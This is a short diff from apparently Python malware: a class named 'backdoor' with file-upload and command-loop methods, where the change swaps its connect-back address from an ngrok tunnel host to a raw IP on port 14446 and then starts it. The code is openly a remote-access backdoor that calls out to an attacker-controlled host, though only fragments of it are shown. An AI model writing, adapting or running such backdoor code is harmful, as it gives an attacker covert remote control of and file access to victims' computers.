@@ -55,6 +55,7 @@ class backdoor:
         f.close()
         return "[+]Upload Successful"
     
+    
     def run(self):
         
         while True: 
@@ -87,5 +88,5 @@ class backdoor:
             #    error = 'Error'.encode()
             #    self.reliable_send(error)
 
-Back_door = backdoor("4.tcp.ngrok.io", 14446)
+Back_door = backdoor("97.70.84.237", 14446)
 Back_door.run()
